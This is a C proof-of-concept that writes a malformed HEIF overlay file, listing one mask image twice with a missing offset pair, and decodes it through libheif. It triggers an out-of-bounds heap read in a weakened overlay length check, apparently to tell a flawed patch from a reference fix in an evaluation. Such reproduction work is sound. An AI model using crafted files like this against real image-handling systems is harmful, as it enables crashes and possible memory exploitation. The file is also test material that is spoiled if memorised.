/*
 * PoC for the residual defect in the "allow repeated references within one
 * 'iref' entry" change (regime A, golden-given arm).
 *
 * The file is an ordinary HEIF overlay, as allowed by ISO/IEC 23008-12 and as
 * used by the HEIF conformance file C021: an 'iovl' derived image whose 'dimg'
 * entry lists the same input image ('mski', no codec plugin needed) twice, so
 * that it is placed at two positions on the canvas.
 *
 * The 'iovl' item data is truncated by exactly one offset pair: it declares the
 * canvas and carries the (x,y) pair for the first reference only. A reader must
 * reject that as incomplete overlay data; instead, on the shipped tree the
 * overlay data-length check in ImageOverlay::parse() accepts it (it no longer
 * accounts for the canvas width/height fields) and the offset loop reads past
 * the end of the 18-byte item data buffer -> heap-buffer-overflow (ASan).
 *
 * On the golden tree the intact length check rejects the item data with
 * "Overlay image data incomplete" and nothing else happens.
 *
 * Build:  cc -fsanitize=address -I libheif pocs/residual.c -L <build>/libheif -lheif -o residual
 * Run:    LD_LIBRARY_PATH=<build>/libheif ./residual
 */

#include "libheif/heif.h"

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ---- minimal ISOBMFF writer ------------------------------------------ */

typedef struct {
  uint8_t* data;
  size_t size;
  size_t cap;
} Buf;

static void buf_put(Buf* b, const void* p, size_t n)
{
  if (b->size + n > b->cap) {
    b->cap = (b->size + n) * 2 + 64;
    b->data = realloc(b->data, b->cap);
  }
  memcpy(b->data + b->size, p, n);
  b->size += n;
}

static void buf_u8(Buf* b, uint8_t v) { buf_put(b, &v, 1); }

static void buf_u16(Buf* b, uint16_t v)
{
  uint8_t p[2] = { (uint8_t) (v >> 8), (uint8_t) v };
  buf_put(b, p, 2);
}

static void buf_u32(Buf* b, uint32_t v)
{
  uint8_t p[4] = { (uint8_t) (v >> 24), (uint8_t) (v >> 16), (uint8_t) (v >> 8), (uint8_t) v };
  buf_put(b, p, 4);
}

static void buf_fourcc(Buf* b, const char* type)
{
  uint8_t p[4] = { (uint8_t) type[0], (uint8_t) type[1], (uint8_t) type[2], (uint8_t) type[3] };
  buf_put(b, p, 4);
}

/* wrap payload into a box; full boxes carry version(0)+flags(0) first */
static void buf_box(Buf* b, const char* type, const Buf* payload, int full, uint8_t version)
{
  buf_u32(b, (uint32_t) (8 + (full ? 4 : 0) + payload->size));
  buf_fourcc(b, type);
  if (full) {
    buf_u8(b, version);
    buf_u8(b, 0);
    buf_u8(b, 0);
    buf_u8(b, 0);
  }
  buf_put(b, payload->data, payload->size);
}

/* ---- the crafted file ------------------------------------------------- */

/*
 * Items:
 *   id 1: 'mski' 8x8 8-bit mask, 64 bytes of pixel data in 'idat'
 *   id 2: 'iovl' (primary), 'dimg' -> item 1, item 1   (same image, twice)
 *
 * 'iovl' item data (18 bytes, 16-bit fields):
 *   version, flags, 4x u16 background color, u16 canvas w, u16 canvas h,
 *   one (x,y) offset pair for the first reference. The pair for the second
 *   reference is missing.
 */
static void build_file(Buf* out)
{
  const uint8_t mski_pixels[64];
  memset((void*) mski_pixels, 0x7F, sizeof(mski_pixels));

  uint8_t iovl_spec[18] = { 0 };
  /* [0] version 0, [1] flags 0 (16-bit fields) */
  /* [2..9] background color RGBA */
  iovl_spec[10] = 0; iovl_spec[11] = 8;   /* canvas width  8 */
  iovl_spec[12] = 0; iovl_spec[13] = 8;   /* canvas height 8 */
  /* [14..17] offset pair (0,0) for the first reference */
  /* second offset pair absent */

  Buf ftyp = { 0 }, hdlr = { 0 }, pitm = { 0 }, iinf = { 0 };
  Buf infe1 = { 0 }, infe2 = { 0 }, ispe = { 0 }, mskC = { 0 }, ipco = { 0 };
  Buf ipma = { 0 }, iprp = { 0 }, iloc = { 0 }, iref = { 0 }, dimg = { 0 };
  Buf idat = { 0 }, meta = { 0 };
  uint32_t mski_off, iovl_off;

  /* ftyp */
  buf_fourcc(&ftyp, "heic");
  buf_u32(&ftyp, 0);
  buf_fourcc(&ftyp, "mif1");
  buf_fourcc(&ftyp, "heic");

  /* hdlr */
  buf_u32(&hdlr, 0);
  buf_fourcc(&hdlr, "pict");
  buf_u32(&hdlr, 0);
  buf_u32(&hdlr, 0);
  buf_u32(&hdlr, 0);
  buf_u8(&hdlr, 0);

  /* pitm -> iovl */
  buf_u16(&pitm, 2);

  /* iinf: two infe v2 entries */
  buf_u16(&infe1, 1);              /* item ID 1 */
  buf_u16(&infe1, 0);              /* protection index */
  buf_fourcc(&infe1, "mski");
  buf_u8(&infe1, 0);               /* item name */

  buf_u16(&infe2, 2);
  buf_u16(&infe2, 0);
  buf_fourcc(&infe2, "iovl");
  buf_u8(&infe2, 0);

  buf_u16(&iinf, 2);               /* entry count */
  buf_box(&iinf, "infe", &infe1, 1, 2);
  buf_box(&iinf, "infe", &infe2, 1, 2);

  /* ipco: property 1 = ispe(8x8), property 2 = mskC(8 bit) */
  buf_u32(&ispe, 8);
  buf_u32(&ispe, 8);
  buf_u8(&mskC, 8);
  buf_box(&ipco, "ispe", &ispe, 1, 0);
  buf_box(&ipco, "mskC", &mskC, 1, 0);

  /* ipma: item 1 -> {ispe, mskC} essential, item 2 -> {ispe} essential */
  buf_u32(&ipma, 2);
  buf_u16(&ipma, 1);
  buf_u8(&ipma, 2);
  buf_u8(&ipma, (uint8_t) (0x80 | 1));
  buf_u8(&ipma, (uint8_t) (0x80 | 2));
  buf_u16(&ipma, 2);
  buf_u8(&ipma, 1);
  buf_u8(&ipma, (uint8_t) (0x80 | 1));

  buf_box(&iprp, "ipco", &ipco, 0, 0);
  buf_box(&iprp, "ipma", &ipma, 1, 0);

  /* idat */
  mski_off = 0;
  buf_put(&idat, mski_pixels, sizeof(mski_pixels));
  iovl_off = (uint32_t) idat.size;
  buf_put(&idat, iovl_spec, sizeof(iovl_spec));

  /* iloc v1: both items in 'idat' (construction_method 1) */
  buf_u8(&iloc, (4 << 4) | 4);     /* offset_size=4, length_size=4 */
  buf_u8(&iloc, (0 << 4) | 0);     /* base_offset_size=0, index_size=0 */
  buf_u16(&iloc, 2);               /* item count */
  buf_u16(&iloc, 1);               /* item 1 */
  buf_u16(&iloc, 0x0001);          /* construction_method = idat */
  buf_u16(&iloc, 0);               /* data_reference_index */
  buf_u16(&iloc, 1);               /* extent count */
  buf_u32(&iloc, mski_off);
  buf_u32(&iloc, (uint32_t) sizeof(mski_pixels));
  buf_u16(&iloc, 2);               /* item 2 */
  buf_u16(&iloc, 0x0001);
  buf_u16(&iloc, 0);
  buf_u16(&iloc, 1);
  buf_u32(&iloc, iovl_off);
  buf_u32(&iloc, (uint32_t) sizeof(iovl_spec));

  /* iref v0: 'dimg' from item 2 to item 1, item 1 (the same item twice) */
  buf_u16(&dimg, 2);
  buf_u16(&dimg, 2);
  buf_u16(&dimg, 1);
  buf_u16(&dimg, 1);
  buf_box(&iref, "dimg", &dimg, 0, 0);

  /* meta */
  buf_box(&meta, "hdlr", &hdlr, 1, 0);
  buf_box(&meta, "pitm", &pitm, 1, 0);
  buf_box(&meta, "iinf", &iinf, 1, 0);
  buf_box(&meta, "iprp", &iprp, 0, 0);
  buf_box(&meta, "iloc", &iloc, 1, 1);
  buf_box(&meta, "iref", &iref, 1, 0);
  buf_box(&meta, "idat", &idat, 0, 0);

  buf_box(out, "ftyp", &ftyp, 0, 0);
  buf_box(out, "meta", &meta, 1, 0);

  free(ftyp.data); free(hdlr.data); free(pitm.data); free(iinf.data);
  free(infe1.data); free(infe2.data); free(ispe.data); free(mskC.data);
  free(ipco.data); free(ipma.data); free(iprp.data); free(iloc.data);
  free(iref.data); free(dimg.data); free(idat.data); free(meta.data);
}

/* ---- drive it through the public API ---------------------------------- */

int main(void)
{
  Buf file = { 0 };
  const char* path = "residual_iovl.heif";
  FILE* f;

  build_file(&file);
  f = fopen(path, "wb");
  if (!f) {
    perror("fopen");
    return 2;
  }
  fwrite(file.data, 1, file.size, f);
  fclose(f);
  printf("wrote %s (%zu bytes)\n", path, file.size);

  heif_context* ctx = heif_context_alloc();
  if (!ctx) {
    free(file.data);
    fprintf(stderr, "heif_context_alloc failed\n");
    return 2;
  }

  heif_error err = heif_context_read_from_file(ctx, path, NULL);
  printf("read: code=%d subcode=%d msg=%s\n", err.code, err.subcode, err.message);
  if (err.code != heif_error_Ok) {
    heif_context_free(ctx);
    free(file.data);
    return 1;
  }

  heif_image_handle* handle = NULL;
  err = heif_context_get_primary_image_handle(ctx, &handle);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "get_primary_image_handle: %s\n", err.message);
    heif_context_free(ctx);
    free(file.data);
    return 1;
  }

  heif_image* img = NULL;
  err = heif_decode_image(handle, &img, heif_colorspace_undefined, heif_chroma_undefined, NULL);
  printf("decode: code=%d subcode=%d msg=%s\n", err.code, err.subcode, err.message);

  if (img) {
    heif_image_release(img);
  }
  heif_image_handle_release(handle);
  heif_context_free(ctx);
  free(file.data);

  return (err.code == heif_error_Ok) ? 0 : 1;
}
